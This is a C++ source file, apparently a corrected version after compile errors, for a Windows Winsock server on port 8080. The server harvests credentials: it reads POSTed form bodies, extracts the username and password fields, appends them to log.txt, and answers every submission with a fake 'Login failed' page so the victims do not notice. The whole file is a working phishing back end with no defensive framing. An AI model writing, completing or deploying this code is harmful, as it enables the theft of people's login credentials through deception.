#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <fstream>          // ← this was missing

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080           // ← this was missing at the top

// Put the function BEFORE main so the compiler sees it
std::string extractCredentials(const std::string& body) {
    std::string username, password;
    size_t userPos = body.find("username=");
    size_t passPos = body.find("password=");
    if (userPos != std::string::npos && passPos != std::string::npos) {
        size_t userEnd = body.find("&", userPos);
        username = body.substr(userPos + 9, (userEnd != std::string::npos ? userEnd : body.size()) - (userPos + 9));
        password = body.substr(passPos + 9);
    }
    return "Username: " + username + " | Password: " + password + "\n";
}

int main() {
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    sockaddr_in serverAddr, clientAddr;
    int addrLen = sizeof(clientAddr);
    char buffer[10000] = {0};

    if (WSAStartup(MAKEWORD(2,2), &wsaData)) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed.\n";
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    listen(serverSocket, SOMAXCONN);
    std::cout << "[*] Listening on port " << PORT << "...\n";

    while (true) {
        clientSocket = accept(serverSocket, (SOCKADDR*)&clientAddr, &addrLen);
        if (clientSocket == INVALID_SOCKET) continue;

        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer)-1, 0);
        if (bytesReceived > 0) {
            std::string request(buffer, bytesReceived);
            size_t bodyStart = request.find("\r\n\r\n");
            if (bodyStart != std::string::npos) {
                std::string body = request.substr(bodyStart + 4);
                if (!body.empty()) {
                    std::string creds = extractCredentials(body);
                    std::ofstream log("log.txt", std::ios::app);
                    log << creds << std::endl;
                    log.close();
                }
            }

            std::string response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h2>Login failed</h2>";
            send(clientSocket, response.c_str(), response.size(), 0);
        }
        closesocket(clientSocket);
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
